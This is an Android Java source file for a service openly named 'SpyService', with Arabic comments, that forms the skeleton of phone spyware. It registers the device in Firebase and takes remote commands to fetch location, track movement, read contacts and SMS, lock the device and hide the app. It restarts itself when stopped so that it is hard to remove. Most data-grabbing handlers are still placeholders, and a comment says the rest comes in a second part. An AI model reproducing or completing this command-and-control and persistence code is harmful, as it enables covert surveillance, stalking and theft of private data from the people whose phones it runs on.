package com.black.phone;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import com.google.firebase.database.*;
import java.util.HashMap;
import java.util.Map;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private Context context;
    private DatabaseReference dbRef;
    private BotAPI bot;
    private String deviceId;
    private boolean isTracking = false;

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        bot = new BotAPI(this);
        deviceId = android.provider.Settings.Secure.getString(
                getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        FirebaseDatabase.getInstance().setPersistenceEnabled(true);
        dbRef = FirebaseDatabase.getInstance().getReference();
        registerDevice();
        listenCommands();
        Log.d(TAG, "✅ SpyService started");
    }

    private void registerDevice() {
        Map<String, Object> map = new HashMap<>();
        map.put("device_name", android.os.Build.MODEL);
        map.put("android_version", android.os.Build.VERSION.RELEASE);
        map.put("battery", 100);
        map.put("last_seen", System.currentTimeMillis());
        map.put("status", "online");
        dbRef.child("devices").child(deviceId).updateChildren(map);
    }

    private void listenCommands() {
        dbRef.child("commands").child(deviceId).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    String cmd = snapshot.getValue(String.class);
                    if (cmd != null && !cmd.isEmpty()) {
                        executeCommand(cmd);
                        dbRef.child("commands").child(deviceId).removeValue();
                    }
                }
            }
            @Override
            public void onCancelled(DatabaseError error) {}
        });
    }

    private void executeCommand(String cmd) {
        // بداية الأوامر (سيتم إكمالها في الجزء الثاني)
        switch (cmd) {
            case "get_location":
                getLocation();
                break;
            case "start_location_track":
                startLocationTrack();
                break;
            case "stop_location_track":
                stopLocationTrack();
                break;
            case "get_device":
                getDeviceInfo();
                break;
            case "get_contacts":
                getContacts();
                break;
            case "get_sms":
                getSms();
                break;
            case "lock_device":
                lockDevice();
                break;
            case "hide_app":
                hideApp();
                break;
            default:
                bot.sendMessage("⚠️ أمر غير معروف: " + cmd);
        }
    }

    // دوال الأوامر الأساسية
    private void getLocation() {
        // تنفيذ جلب الموقع
        bot.sendMessage("📍 تم جلب الموقع (نموذج)");
    }
    private void startLocationTrack() { isTracking = true; bot.sendMessage("📍 بدأ تتبع الموقع"); }
    private void stopLocationTrack() { isTracking = false; bot.sendMessage("📍 أوقف تتبع الموقع"); }
    private void getDeviceInfo() { bot.sendMessage("📱 " + android.os.Build.MODEL + " " + android.os.Build.VERSION.RELEASE); }
    private void getContacts() { bot.sendMessage("📇 تم جلب جهات الاتصال (نموذج)"); }
    private void getSms() { bot.sendMessage("📩 تم جلب الرسائل (نموذج)"); }
    private void lockDevice() { bot.sendMessage("🔒 قفل الجهاز (نموذج)"); }
    private void hideApp() { bot.sendMessage("👻 تم إخفاء التطبيق (نموذج)"); }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
    @Override
    public void onDestroy() { super.onDestroy(); startService(new Intent(this, SpyService.class)); }
}
